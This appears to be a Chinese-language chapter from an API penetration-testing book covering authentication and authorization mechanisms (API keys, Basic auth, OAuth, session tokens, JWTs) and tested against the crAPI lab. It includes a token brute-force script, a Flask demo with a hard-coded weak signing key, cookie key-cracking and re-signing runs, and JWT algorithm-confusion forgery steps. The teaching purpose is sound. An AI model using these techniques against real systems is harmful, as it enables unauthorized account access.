

# 第四章：认证与授权测试

假设你已经阅读了上一章或者对**应用程序编程接口**（**API**）侦察有所了解，现在是时候深入进行 API 渗透测试了。在上一章中，我们通过访问属于其他用户的对象中的数据来完成了一个 crAPI 挑战。这些数据应该受到保护，但 crAPI 没有正确地执行。这是一个授权缺陷。

我们需要调查 API 如何建立其最基本的安全机制，即如何认证和授权用户。我们将使用术语**AuthN**来指代**认证**，使用**AuthZ**来指代**授权**，以便简化这些词汇；这在文献中是一个常见做法。弱认证机制通常可以在我们工作初期发现，这一部分内容在上一章已经讲解过。经过一些交互和分析后，我们可以发现 API 所应用的数据结构，然后发现弱授权控制。

在本章中，你将更深入地学习这两个话题，不仅分析它们如何被 API 展示，还将理解配置和实施它们的最佳实践，以保护应用环境。弱或实现不当的认证和/或授权防护措施可能会危及整个应用程序，而不仅仅是 API。

在本章中，我们将讨论以下主要话题：

+   审查认证机制

+   测试弱凭证和默认账户

+   探索授权机制

+   绕过访问控制

# 技术要求

我们将利用与*第三章*中描述的相同环境。总的来说，你需要一个类型 2 的虚拟化管理程序，如 VirtualBox，以及我们之前使用的相同工具，特别是 crAPI 项目。

# 审查认证机制

网络上有许多 API 在不需要前期认证的情况下工作，主要用于只读操作。一个典型的例子是**综合知识档案网络**（**CKAN**）框架（[`ckan.org/`](https://ckan.org/)）。这是一个开源项目，旨在帮助企业和政府在互联网上发布数据。整个框架使用 Python 编写，具有一个 RESTful API，支持读写操作。由于 CKAN 被设计用来帮助*开放数据*倡议，因此拥有对其所提供的数据的读取访问权限是预期中的。

也有不少 API 端点不需要认证（AuthN）。在上一章中，我们提到了 OSINT Framework，这是一个策划其他**开源情报**（**OSINT**）网站、工具和博客的列表网站。你会发现一些工具，例如 IP 位置和地理位置查询，它们完全免费且不需要事先认证就能在互联网上使用。在这种情况下，仅允许读取操作，服务提供者应保护其后台，防止未经授权的数据访问尝试。

迟早，API 可能需要一种认证机制（AuthN）。我们将逐一解释不同的认证机制。目前，以下是实现 API 时最常见的几种认证方式，特别是 RESTful API：

+   **API 密钥**：为应用程序颁发的唯一标识符，用于认证（AuthN）。公共云提供商可能会给你一到两个这样的密钥，以便你在通过 API 与提供商交互时能够识别自己（或某些代码）。

+   **基础认证（Basic AuthN）**：通过 Base64 编码传输用户名和密码（不推荐用于敏感数据）。许多人仍然将编码与加密混淆。即使文本看起来像是完全无意义的，单纯的编码数据并没有安全性。即便基本认证是在加密通道上进行的，如 TLS 连接，仍应尽量避免使用这种方式。

+   **OAuth**：一种开放标准，用于授权（AuthZ），在不共享凭据的情况下委托访问。也称为持有者令牌（bearer token），OAuth 2.0 提供了基于令牌的认证机制（AuthN）。客户端从授权服务器获取令牌，并将其包含在 API 请求中。**OpenID Connect**（**OIDC**）是建立在 OAuth 之上的认证层（AuthN）。OIDC 通过添加身份层增强了 OAuth，使客户端能够验证最终用户的身份。

+   **会话令牌**：用于在初次登录后维持已认证状态。它们像是登录后生成的临时密钥，存储在你的浏览器或网站代码中。它们在不需要频繁登录的情况下帮助你在在线平台上进行身份识别，同时提供便利和安全性。

+   **JSON Web 令牌（JWTs）**：自包含的令牌，携带用户信息和声明。这是一种紧凑、URL 安全的方式，用于表示两个方之间的声明。它们通常作为持有者令牌（bearer tokens）用于认证（AuthN）。JWTs 常通过请求头或查询参数传递。

让我们深入探讨这些方法的细节。

## API 密钥

API 密钥是一种身份验证（AuthN）形式，用于控制对 API 的访问。它们是字符字符串，通常由 API 提供商生成，作为令牌来验证和授权客户端（应用程序、用户或其他服务）向 API 服务器发送的请求。它们是唯一的字符字符串，充当数字标识符，允许应用程序访问 API。它们作为基本的身份验证机制，确保只有授权用户才能访问敏感数据或功能。正如前面提到的，这也是公共云提供商在其平台中选择建立身份验证的方式之一，通常在客户编写与 API 交互的应用程序或使用 CLI 工具时实现。

API 密钥可以作为单个密钥或密钥对（更常见）生成。当以密钥对的形式呈现时，其中一个密钥代表登录名/用户名，而另一个则像密码一样工作。这些密钥与实际用户名在内部关联。你可能会问，为什么需要一对额外的凭证，而知名的用户名/密码方法就能解决身份验证（AuthN）问题？其实很简单：虽然一个用户名只能有一个活动密码，但同一个用户名可以有多个附加的 API 密钥，并且这些密钥可以绑定不同的权限（身份授权，AuthZ）。另一个区别在于概念的本质。API 密钥允许*应用程序*与 API 进行交互，而用户名/密码凭证对则是供*人类*使用的。

要使用 API 密钥，必须在所有请求中提供它们。处理这些密钥的策略有很多。一些工具将它们存储在明文配置文件中并加载到内存中，而另一些则简单地创建环境变量来存储内容。密钥的存储方式正是发现它们的首选方法。开发人员时不时会将密钥泄露到公共代码库中，或者将其硬编码到 HTML 或 JavaScript 文件中。你可以利用一些工具来帮助你完成这一步骤，以下是一些示例：

+   **badsecrets** ([`github.com/blacklanternsecurity/badsecrets`](https://github.com/blacklanternsecurity/badsecrets)): 用于在多个不同平台上查找密钥的库。

+   **Gitleaks** ([`gitleaks.io/`](https://gitleaks.io/)): 可能是最受欢迎的工具，用于在类似 Git 的代码库、目录和文件中查找密钥。

+   **KeyFinder** ([`github.com/momenbasel/KeyFinder`](https://github.com/momenbasel/KeyFinder)): Chrome 扩展程序，用于在浏览网页时查找密钥。

+   **Keyhacks** ([`github.com/streaak/keyhacks`](https://github.com/streaak/keyhacks)): 包含在各种漏洞赏金计划中发现的密钥的公共代码库。帮助你检查这些密钥在计划结束后是否有效。此工具有 ChatGPT Plus 版本：https://chat.openai.com/g/g-JaNIbfsRt-keyhacks-gpt。

+   **Mantra** ([`github.com/MrEmpy/mantra`](https://github.com/MrEmpy/mantra)): 在 HTML 和 JavaScript 文件中查找密钥。

+   **Nuclei Templates** ([`github.com/projectdiscovery/nuclei-templates`](https://github.com/projectdiscovery/nuclei-templates)): 你可以使用它对各种 API 端点测试相同的密钥。

+   **Secrets Patterns DB** ([`github.com/mazen160/secrets-patterns-db`](https://github.com/mazen160/secrets-patterns-db)): 一个正则表达式数据库，可以被其他工具使用，例如 TruffleHog，用于在各种类型的文件中查找密钥、令牌或密码模式。

+   **TruffleHog** ([`github.com/trufflesecurity/truffleHog`](https://github.com/trufflesecurity/truffleHog)): 一个瑞士军刀工具，可以在许多地方查找密钥和秘密，包括 GitHub 仓库和容器镜像。

这些工具有的以容器形式运行，有的作为库可以用来增强你自己的代码，有的则是命令行工具。你不会难以找到其他类似的工具，包括 Kali Linux 等渗透测试发行版。让我们先用 TruffleHog 对我的一些个人 GitHub 仓库做一个快速测试。首先，我们将单独使用该工具，然后添加 Secrets Patterns DB。为了使用 Secrets Patterns DB，我们首先需要用它创建一个正则表达式 JSON 模式文件。让我们先运行工具：

```
$ docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo https://github.com/mauricioharley/barbican-operator --issue-comments --pr-comments
TruffleHog. Unearth your secrets.
2024-01-03T12:22:34Z	info-0	trufflehog	running source	{"source_manager_worker_id": "WH1SL", "with_units": false, "target_count": 0, "source_manager_units_configurable": true}
2024-01-03T12:22:34Z	info-0	trufflehog	Completed enumeration	{"num_repos": 1, "num_orgs": 0, "num_members": 0}
2024-01-03T12:22:36Z	info-0	trufflehog	finished scanning	{"chunks": 1056, "bytes": 861040, "verified_secrets": 0, "unverified_secrets": 0, "scan_duration": "2.502645278s"}
```

现在，让我们利用 Secrets Pattern DB 并重新运行它：

```
$ ./convert-rules.py --db ../db/rules-stable.yml --type trufflehog > /tmp/regex.json
$ ./trufflehog github --repo https://github.com/mauricioharley/barbican-operator --include-paths=/tmp/regex.json --issue-comments --pr-comments
TruffleHog. Unearth your secrets.
2024-01-03T14:38:49+01:00	info-0	trufflehog	running source	{"source_manager_worker_id": "v1HMM", "with_units": false, "target_count": 0, "source_manager_units_configurable": true}
2024-01-03T14:38:49+01:00	info-0	trufflehog	Completed enumeration	{"num_repos": 1, "num_orgs": 0, "num_members": 0}
2024-01-03T14:38:52+01:00	info-0	trufflehog	finished scanning	{"chunks": 0, "bytes": 0, "verified_secrets": 0, "unverified_secrets": 0, "scan_duration": "2.861085032s"}
```

幸运的是，到目前为止没有发现任何秘密。顺便提一句，在生成上面输出中的 `regex.json` 文件后，我遇到了一些已填充的正则表达式问题。也许是因为 Secrets Patterns DB 中某些更新丢失了，因为它提到的是 TruffleHog 版本 2，而该工具已经是版本 3。

## 基本身份验证

这是可能最容易被检测到的 AuthN 方法之一。每次你尝试访问一个网站，浏览器显示一个对话框请求你输入凭证对时，那就是基本身份验证。当一个 Web 客户端访问一个需要基本身份验证的服务器时，所有请求都会提供一个 `Authorization` 头部，里面包含用户名和密码，中间用冒号分隔，所有内容都经过 Base64 编码。

一个示例请求可能是这样的：

```
GET /api/v2/list_resources
Authorization: Basic bWF1cmljaW86TXlQYXNzd29yZCNAIQo=
```

当服务器接收到请求时，进行一个简单的 Base64 解码操作，以检查凭证是否有效。当身份验证通过时，服务器响应请求；否则，发送一个 401 代码表示未授权操作。在这里，还有一些其他因素需要考虑：这样的用户数据库是如何安全存储和处理的？凭证在存储时是否加密？是否有某种哈希或加盐机制来生成或再次验证密码的有效性？

那么，如何识别何时使用这种 AuthN？很简单。第一种方法是通过分析请求。`Authorization`关键字的存在就能明确表示。响应也可以表明其存在。根据服务器的实现方式，你可能会收到`WWW-Authenticate`头。最后，如果连接没有通过 TLS 加密保护，任何网络检查工具，如 Wireshark，都会披露 AuthN 类型。一些非常旧的 Web 服务器甚至可能将用户名和密码包含在查询字符串本身中。

攻击基本身份验证（AuthN）环境的一些方式包括通过**中间人攻击**（**MiTM**）来进行，尤其是在未应用 TLS 的情况下，或通过暴力破解系统，尝试系统地猜测凭证对，甚至通过社会工程学攻击，如钓鱼攻击。事实上，基本的 AuthN 非常不安全且过时，因此你可能不会在很多 API 端点上看到它。然而，在我撰写本章时进行的一些搜索中，我发现了一些文档，解释了如何配置像 WSO2 这样的产品（[`apim.docs.wso2.com/en/3.0.0/learn/design-api/endpoints/endpoint-security/basic-auth/`](https://apim.docs.wso2.com/en/3.0.0/learn/design-api/endpoints/endpoint-security/basic-auth/)）以及 Apigee 的 Edge API（[`docs.apigee.com/api-platform/system-administration/basic-auth`](https://docs.apigee.com/api-platform/system-administration/basic-auth)）。令人望而生畏……

## OAuth

这可能是当前网络上最常用的 AuthN 机制之一。OAuth 是实现这一点的关键，例如，它允许你登录到你喜欢的游戏平台，而无需创建凭证对，只需利用一些现有的外部凭证，例如你用来访问 Google、Facebook 或 Apple 账户的凭证。

OAuth 至今发布了两个版本。版本 1.0 于 2010 年发布，并引入了基于令牌的 AuthN 核心概念。它依赖于使用加密签名来保护通信。OAuth 2.0 于 2012 年发布，是自那时以来的最新版本。它是 OAuth 1.0 的重要演变，引入了更简化和灵活的授权框架。它依赖于令牌，包括访问令牌和刷新令牌，用于授予访问权限和管理权限。

一些关键组件需要提及：

+   **资源所有者**：拥有资源的实体，通常是最终用户。

+   **客户端**：希望访问用户资源的应用程序或服务。

+   **授权服务器**：管理授权过程，并在成功进行身份验证后发放访问令牌。

+   **资源服务器**：托管客户端希望访问的受保护资源（例如用户照片）。

+   **访问令牌**：表示资源所有者授权的凭证。

+   **刷新令牌**：一种用于在当前访问令牌过期时获取新访问令牌的凭证。

我们可以通过几种方式检测 API 端点是否使用 OAuth。文档是最先要查看的地方，并且可以节省时间。此外，`Authorization: Bearer <token>` 或 `Authorization: Bearer <token type> <token>` 的存在也会揭示认证类型。最后，您可以采用通用的 *试错* 方法，发送一些包含无效令牌的虚拟请求并捕获输出。crAPI 项目没有使用这种方法，而是采用了一种类似的方法，我们将在下一节中讨论。

将 OAuth 应用于 Web 应用程序的目的之一是允许用户使用 **单点登录**（**SSO**）。通过在一个地方存储用户的凭证，至少对于用户的数据库来说，这个地方需要特别关注加密保护。然后，通过使用安全的方式传输凭证，相同的用户可以无缝地登录到多个不同的应用程序，而无需每次都提供凭证对。

在 OAuth 架构中，**身份提供者**（**IdP**）是负责存储和管理凭证对的元素。OAuth 2.0 规范有几种不同的授权流程（即授予请求访问令牌给请求应用程序的方式）。在与 IdP 集成时，开发者需要在不同的流程之间做出选择：

+   **授权码授权（ACG）流程**：通常这是最佳选择，因为它包含了双重验证步骤。它需要一个后端服务器，并进行一些 HTTP 302 重定向到重定向端点，提供一些代码。应用程序开发者需要确认 IdP 提供的端点与用户所使用的端点相同。

+   **隐式授权流程（IGF）**：也称为仅客户端流程，这是第二常见的选项。在这种情况下，没有后端服务器。应用程序直接与身份提供者（IdP）通信。用户凭证被提供以获取 OAuth 访问令牌。由于客户端 ID 容易被伪造，因此没有客户端 ID。

+   **客户端凭证授权（CCG）流程**：这是一个小众的使用场景，通常不常见。CCG 可以在客户端应用程序拥有并使用与服务提供商的资源时使用，这些资源由客户端应用程序本身拥有和消费，而不是由最终用户拥有和消费。在 CCG 流程中，客户端应用程序代表自己请求访问令牌，然后随后使用该访问令牌来访问它所需的受保护资源。

+   **密码授权流程**：绝对不应该使用此流程。它非常简单，因为只需要通过常规的 POST 请求传递用户名和密码。根据 OAuth 2.0 安全最佳实践（见 *进一步* *阅读* 部分的链接），此方法是不允许的。

有一些 OAuth 配置错误可能导致我们成功攻击利用这种机制的应用程序。客户端 ID 和客户端密钥绝不应暴露给最终用户。它们应该像凭证一样受到保护，因为它们可能允许恶意用户代表合法的应用程序调用身份提供者 (IdP)，从而冒充该合法应用程序。对于 OAuth 2.0，仅凭此并不能实现用户冒充，因为攻击者仍然需要获取用户凭证。然而，恶意用户可以构建一个克隆的应用程序，收集用户凭证。通过生成可点击的链接并将其放入论坛或邮件中（这些链接指向攻击者配置了被盗客户端 ID/客户端密钥的后端服务器），此攻击会变得更加容易。

一种针对 OAuth 授权 API 的常见攻击方式是暴力破解。crAPI 并未采用这种机制，但让我们通过一些简单的 Python 代码与车辆部件网站进行交互，看看我们能得到什么。该代码改编自 Tescum ([`github.com/akimbo7/Tescum`](https://github.com/akimbo7/Tescum))，具体如下：

```
import random, requests, string, time
token_start = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ"
symbols = string.ascii_letters + string.digits + "_.-"
tries = 1000 # Choose a number at your convenience
wait_time = 50 # Number of ms to wait for before sending the next request
for _ in range(tries):
    key = token_start + ''.join(random.choice(symbols) for i in range(464-len(token_start))) # crAPI tokens have 464 bytes.
    headers = {'Authorization': f'Bearer {key}'}
    r = requests.get(
            'http://localhost:8888/workshop/api/shop/products',
            headers = headers)
    if 'Invalid JWT Token!' in r.text:
        print(f"Token FAILED {key}")
        print(f"Code: {r.status_code} Message: {r.json()['message']}\n")
    else:
        print(f"Token OK! {key}")
    time.sleep(round(wait_time / 1000))
```

现在做些解释。这个代码最好像原始版本那样使用线程运行，但在我的测试系统上只成功运行过一次！撇开这个不谈，之前的版本运行良好，我添加了一行睡眠时间来避免过度加载 crAPI 的端点。在一些登录活动中，我发现所有的 bearer token 都以 `eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ` 开头。因此，我将其分配给一个变量。这部分解码后代表 `{"alg":"RS256"}`，是从 Base64 解码得到的。令牌的其余部分是由字母、数字以及符号 `-`、`.` 和 `_` 组成的随机序列。某些迭代会生成不太可能有效的令牌，例如以一对下划线结尾的令牌，而其他的则更相似。你可以尝试数千次而没有成功，但最终它会成功。这是一个简单的暴力破解脚本建议。

一些应用程序有更简单的令牌生命周期管理，将令牌存储在本地数据库中，并且从不轮换或过期。虽然这种做法方便，因为它让代码更简洁、更易于维护，但也存在固有的安全问题。根据存储位置的保护程度，这个数据库可能会因为攻击而被泄露或外泄，从而使应用程序所有用户的凭证暴露。令牌不经常轮换也是一个不良习惯，因为某些用户可能会选择以不安全的方式将其本地存储，这将使它们容易受到一些客户端攻击，包括钓鱼攻击的变种。

OAuth 并非绝对安全。 2023 年末，有关 Google OAuth 实现的故障被披露给公众，该公司在被通知后多天未采取进一步的修复措施。 问题出在 Google 如何处理其帐户上的电子邮件地址，允许具有相同域名的不同邮箱提交相同的声明。 解释在这里提供：[`trufflesecurity.com/blog/google-oauth-is-broken-sort-of/`](https://trufflesecurity.com/blog/google-oauth-is-broken-sort-of/)。

## 会话令牌

会话令牌一直是 Web 安全的基本组成部分，与 Web 应用程序的增长同步发展。 它们的历史可以追溯到在与 Web 服务器的多次交互中安全地维护用户状态的需求。 会话令牌是在成功的 AuthN 之后分配给用户的唯一标识符。 它作为引用存储在服务器上的用户会话数据。 通常，用户登录后会生成会话令牌，并作为 cookie 发送回客户端。 客户端的后续请求包括此令牌，允许服务器识别用户并检索其会话数据。 此机制有助于在无状态的 HTTP 中维护有状态的交互，增强用户体验和安全性。

在典型情况下，用户登录到 Web 应用程序后，会生成一个会话令牌，并安全地存储在服务器上，然后发送到客户端。 这个令牌随后包含在后续的请求中，使服务器能够将请求与特定用户的会话关联起来，并提供个性化内容或维护用户特定的设置。 检测会话令牌的使用涉及检查客户端和服务器之间的通信。 它们通常在 HTTP cookie 中找到，通过名称如`session_id`或`access_token`识别。 此外，检查 HTTP 请求的标头可能会显示会话令牌的存在。 让我们通过一个示例 Flask 应用程序观察如何生成这样的令牌：

```
from flask import Flask, request, session, jsonify
app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_key'
# Dummy user data for authentication
users = {
    'user1': {'password': 'pass123', 'role': 'user'},
    'admin': {'password': 'adminpass', 'role': 'admin'}
}
@app.route('/')
def home():
    if 'username' in session:
        return f'Hello, {session["username"]}! Your role is {session["role"]}.'
    return 'Welcome to the home page. Please login.'
@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    if username in users and users[username]['password'] == password:
        session['username'] = username
        session['role'] = users[username]['role']
        resp = jsonify({'message': 'Login successful!'})
        resp.set_cookie('session_token', session['username'])
        return resp
    else:
        return 'Login failed. Check your username and password.'
@app.route('/logout')
def logout():
    session.pop('username', None)
    session.pop('role', None)
    resp = jsonify({'message': 'Logout successful!'})
    resp.delete_cookie('session_token')
    return resp
if __name__ == '__main__':
    app.run(debug=True)
```

您可以通过 Postman 与此应用程序进行交互，或者更简单地使用几个`curl`命令。 应用程序正在等待 POST 请求作为登录和后续的 GET 请求。 登录体必须以 JSON 格式提供，因此我们需要相应地指示`curl`。 另外，为了确保会话 cookie 正确地存储在本地，我们使用`--cookie-jar`选项：

```
$ curl http://localhost:5000
Welcome to the home page. Please login.
$ curl -X POST -H "Content-Type: application/json" -d '{"username": "user1", "password": "pass123"}' http://localhost:5000/login --cookie-jar cookie.txt
{
  "message": "Login successful!"
}
$ curl -b cookie.txt -c cookie.txt http://localhost:5000/
Hello, user1! Your role is user.
$ curl -b cookie.txt -c cookie.txt http://localhost:5000/logout
{
  "message": "Logout successful!"
}
```

`cookie.txt`文件的内容将如下所示（字体大小缩小以便理解）：

```
#HttpOnly_localhost	FALSE	/	FALSE	0	session eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.Za2WiQ.jnPujptv1NBAqEYCbCKsk6hkq6c
localhost	FALSE	/	FALSE	0	session_token	user1
```

如果未能安全处理，会话令牌容易受到攻击。 常见的攻击包括**会话劫持**，其中攻击者窃取用户的会话令牌并冒充他们。 **会话固定**是另一种威胁，涉及攻击者强制用户使用特定的会话令牌。 您可以通过使用首选 Web 浏览器的开发者模式轻松发现某些 API 端点是否使用此机制。 例如，crAPI 不使用它。

在我们提供的这个实现中，cookie 是用应用程序源代码一开始的密钥签名的。有一个非常实用的用 Go 语言编写的工具叫做 CookieMonster（[`github.com/iangcarroll/cookiemonster`](https://github.com/iangcarroll/cookiemonster)），你可以利用它来发现这个密钥。它使用一个默认的字典，但也支持你自己的字典，这赋予了它非常强大的功能。让我们用我们示例应用程序生成的 cookie 进行测试：

```
$ ./cookiemonster -cookie "eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.Za2WiQ.jnPujptv1NBAqEYCbCKsk6hkq6c"
   CookieMonster 1.4.0
  CookieMonster loaded the default wordlist; it has 38919 entries.
 Success! I discovered the key for this cookie with the flask decoder; it is "secret_key".
```

然后，*瞧！* 该工具还有一个方便的功能，用于重新签发 cookie，你可以利用它通过创建一个包含相应令牌的 cookie 来绕过 API 的授权（AuthZ）机制，而无需先进行认证。然而，目前它仅适用于 Django 应用程序：

```
$ ./cookiemonster -cookie "eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.Za2WiQ.jnPujptv1NBAqEYCbCKsk6hkq6c" 
-resign "My Own Data"
  CookieMonster 1.4.0
  CookieMonster loaded the default wordlist; it has 38919 entries.
 Success! I discovered the key for this cookie with the flask decoder; it is "secret_key".
 I resigned this cookie for you; the new one is: TXkgT3duIERhdGE.Za2WiQ.UJu6-KPF2cdDy2bFz6bk3vi-OhY
```

## JSON Web Tokens（JWT）

JWT（JSON Web Tokens）是目前用于在网络上验证和授权应用程序及用户的最现代化方式之一。它们出现在 2010 年代初期，作为对移动领域日益增多的应用程序数量的提案。这一领域天生就有对安全的认证（AuthN）和授权（AuthZ）机制的需求。JWT 与我们之前讨论的其他方法不同，因为它将用户身份与服务器会话解耦。它们提供了一种更安全的方式来将必要的数据传递到不同的系统和应用程序中。

每个 JWT 都有三个部分：

+   **头部**：包含关于令牌的元数据，包括其格式和签名算法。

+   **有效载荷**：包含关于用户的实际声明，如用户名、角色和权限。这些数据通常以 JSON 格式进行编码。

+   **签名**：使用密钥生成的独特加密指纹，确保令牌的完整性和真实性。

当你登录到一个启用了 JWT 的系统时，服务器会生成一个包含你声明的 JWT，并使用一个密钥对其进行签名。这个令牌随后会发送到你的浏览器并安全存储。每次后续请求时，浏览器会自动将令牌发送到服务器。服务器验证签名并解码有效载荷，基于用户的声明授予访问权限。要检测 API 端点中 JWT 的使用，可以检查传入请求的头部。JWT 通常会通过`Authorization`头部，使用`Bearer`方案进行传输，如`Authorization: Bearer <token>`。crAPI 便是如此。此外，API 文档或响应头部可能会包含信息，指示使用 JWT 进行认证（AuthN）。

在处理 JWT 时，有两个工具你应该考虑。第一个是[`jwt.io/`](https://jwt.io/)。头部、有效载荷和签名被用不同的颜色突出显示，以便于理解。通过使用 Postman、`curl`或你的网页浏览器的开发者工具，登录到 crAPI 并获取生成的令牌，作为成功认证尝试的响应（*图 4.1*）。将其存储在某个地方。

![图 4.1 – crAPI 成功登录后生成的令牌](img/B19657_04_01.jpg)

图 4.1 – 成功登录后生成的 crAPI 令牌

将令牌复制到 JWT.io 网站的**Encoded**部分。这将显示关于令牌的所有细节，包括用于生成它的算法。现在，下载第二个工具 JWT Toolkit v2，地址是[`github.com/ticarpi/jwt_tool`](https://github.com/ticarpi/jwt_tool)。这是一个 Python 脚本，可以执行与 JWT 相关的多种任务。让我们看看它对我们最近复制的令牌说了什么（部分命令已省略，简化演示）：

```
$ python jwt_tool.py eyJhbGciOiJSUzI1NiJ9.eyJzdW...
Token header values:
[+] alg = "RS256"
Token payload values:
[+] sub = "mauricio@domain.com"
[+] role = "user"
[+] iat = 1706051672    ==> TIMESTAMP = 2024-01-24 00:14:32 (UTC)
[+] exp = 1706656472    ==> TIMESTAMP = 2024-01-31 00:14:32 (UTC)
Seen timestamps:
[*] iat was seen
[*] exp is later than iat by: 7 days, 0 hours, 0 mins
```

我们可以看到令牌是使用 RS256 签名的，并且其负载中有四个值：`sub`（通常是用户名）、一个角色和两个时间戳，分别表示令牌的发行时间和过期时间。JWT 可以使用多种算法进行签名，但通常见到的是以下两种方式之一：使用 HS 或不使用 HS。以 HS 开头的 JWT 最容易受到攻击，因为它们是对称签名方法。它们使用**基于哈希的消息认证码**（**HMAC**）结合**安全哈希算法**（**SHA**）哈希。由于它们是对称方法，在多个对等方相互通信的场景中，保护和共享签名密钥变得更加困难。当然，一旦密钥被泄露，就可以伪造令牌，且 AuthN/AuthZ 系统无法识别与合法令牌的区别。

另一方面，类似 RS 的 JWT 使用**Rivest-Shamir-Adleman**（**RSA**）非对称算法，服务器使用私钥签署令牌，并发布相应的公钥以便第三方验证令牌。该系统的安全性取决于用于保护私钥的机制。显然，这些令牌更安全，但由于使用了非对称算法，其生成和验证可能会较慢。

然而，即使是采用 RS 实现的系统，也可能会受到 JWT 攻击的威胁。有几种方法可以测试是否存在漏洞。借助我们的朋友`jwt_tool`，我们可以对 crAPI 部署进行测试，看看它是否能发现漏洞。在记录下你登录时收到的 AuthZ 令牌后，输入以下命令（单行命令）。`/workshop/api/shop/products`是 crAPI 的一个端点：

```
$ python jwt_tool.py -M at -t "http://localhost:8888/workshop/api/shop/products" -rh "Authorization: Bearer <original token>"
...
[+] Sending token
jwttool_7eaff80aee0ab3e8792d5bc1292a927b Sending token Response Code: 200, 169 bytes
Running Scanning Module:
Running prescan checks...
...
Scanning mode completed: review the above results.
```

没有发现漏洞。工具在攻击原始令牌时未成功。它建议使用`hashcat`尝试一些暴力破解攻击。你可以试试看，但会发现 hashcat 会抱怨令牌的大小，表示它太大。

实现 JWT 的 API 可能在`/.well-known/jwks.json`或`/jwks.json`路径下提供一个端点。这些端点的唯一目的是公开用于签署 API 生成的令牌的公钥。你可以访问`http://localhost:8888/.well-known/jwks.json`并复制其内容。它是一个 JSON 结构，包含一系列的键和值，类似于这样：

```
{ "keys": [ { "kty": "RSA", "e": "AQAB", "use": "sig", "kid": "MKMZkDenUfuDF2byYowDj7tW5Ox6XG4Y1THTEGScRg8", "alg": "RS256", "n": "sZKrGYja9S7BkO-waOcupoGY6BQjixJkg1Uitt278NbiCSnBRw5_cmfuWFFFPgRxabBZBJwJAujnQrlgTLXnRRItM9SRO884cEXn-s4Uc8qwk6pev63qb8no6aCVY0dFpthEGtOP-3KIJ2kx2i5HNzm8d7fG3ZswZrttDVbSSTy8UjPTOr4xVw1Yyh_GzGK9i_RYBWHftDsVfKrHcgGn1F_T6W0cgcnh4KFmbyOQ7dUy8Uc6Gu8JHeHJVt2vGcn50EDtUy2YN-UnZPjCSC7vYOfd5teUR_Bf4jg8GN6UnLbr_Et8HUnz9RFBLkPIf0NiY6iRjp9ooSDkml2OGql3ww" } ] }
```

我们知道用户的角色是`user`，这使我们推测这是一个普通的无权角色。我们的任务现在是伪造一个令牌，使该用户成为 crAPI 的管理员。由于该令牌不是使用 HMAC 算法签名的，因此我们不能使用`jwt_tool`的`-C`选项来破解令牌。如果普通用户的角色被称为`user`，也许管理员角色是`admin`。我们将检查 crAPI 是否容易受到密钥混淆漏洞的攻击，即通过提供 HS256 作为签名算法来欺骗 Web 服务器，并检查服务器的令牌验证功能是否足够天真，将提供的公钥当作 HMAC 密钥。接下来的测试，你应该考虑使用**Burp Suite**并安装**JWT**和**JWT Editor**扩展。我们将进行以下操作：

1.  获取服务器的公钥（我们已经获得）。

1.  将密钥转换为适当的格式。

1.  通过将“alg”头设置为 HS256，生成一个新的 JWT。

1.  使用 HS256 签署新的令牌，并将公钥用作对称密钥。

只需按照以下步骤操作，就可以完成：

1.  打开 Burp Suite 并安装前述的扩展。你可以通过**Extensions** | **BApp** **Store**选项卡进行安装。

1.  点击**JWT Editor**扩展，然后点击**New** **RSA Key**。

1.  在此窗口中，将 JWKS 内容粘贴到`key`块内（粘贴时，抑制`keys`部分和周围的花括号）。

1.  接下来，选择**PEM**单选按钮。这将显示 PEM 格式的公钥。

1.  复制此文本并点击**OK**按钮。

1.  转到**Decoder**扩展，粘贴 PEM 公钥，点击**Encode as...**按钮，然后选择**Base64**。复制结果。

1.  返回到**JWT Editor**扩展并点击**New Symmetric Key**。这将打开一个窗口，默认选中**Random secret**选项。

1.  只需点击**Generate**按钮。

1.  用从**Decoder**扩展复制的文本替换`k`参数的内容。

1.  点击**OK**。

配置你的 Web 浏览器，将 Burp Suite 用作代理。默认情况下，Burp Suite 在 localhost 端口`8080`上运行，但可以调整。用有效的用户名和密码登录到 crAPI。这将生成一个有效的令牌。切换到`/identity/api/v2/vehicle/vehicles`。选择此请求，右键点击它，选择**Send to repeater**。打开**Repeater**。你将在**Raw**和**Hex**标签旁边看到**JSON Web Tokens**标签。点击它。将算法更改为**HS256**，将角色更改为**admin**。

现在点击`/workshop/api/shop/products`，并发送请求。它会以`Invalid JWT Token`消息失败。这可能意味着 crAPI 的 JWT 实现没有受到密钥混淆漏洞的影响。但是，如果你将端点更改为`/identity/api/v2/user/dashboard`，crAPI 将返回一个有效的响应，并提供一个包含我们原始角色的 JSON 结构（*图 4.2*）：

![图 4.2 – crAPI 仅接受伪造的令牌用于用户仪表板端点](img/B19657_04_02.jpg)

图 4.2 – crAPI 仅接受伪造的令牌用于用户仪表板端点

会话令牌、承载令牌和 JWT 在目的上相似，但在实现上有所不同。会话令牌通常存储在服务器上，其对应的数据也存储在服务器端。承载令牌是自包含的，通常用于 OAuth 进行 API 授权，而 JWT 是一种承载令牌，具有额外的特性，如声明和数字签名，使其在安全数据交换中更为多用途。会话令牌与用户会话紧密相关，常用于 Web 应用程序中以维持用户状态。

本质上，虽然会话令牌是特定于 Web 应用程序中的用户会话的，但承载令牌和 JWT 是用于各种身份认证（AuthN）和授权（AuthZ）目的的更广泛的概念，每种都有其独特的优势和注意事项，在不同的上下文中需要做出权衡。理解它们的特点对于 Web 开发和 API 安全中的安全有效实现至关重要。

在下一节中，我们将探讨如何发现并实现使用弱凭证和默认账户的身份认证和授权。

# 测试弱凭证和默认账户

阅读本节标题时，作为一个细心的读者，你可能会联想到许多路由器、接入点、网络桥接设备，以及无数的**物联网**（**IoT**）设备。遗憾的是，根据客户需求，这些设备通常只是被简单配置后投入使用，几乎就像一个“即插即用”的盒子。实际上，一些设备设计的初衷正是如此。问题在于，这些设备中的某些类型实际上是被设计为智能设备，这就需要运行更复杂的软件以及**凭证要求**。由于许多用户/客户根本不关心产品如何工作，探索默认凭证的可能性几乎是无限的。

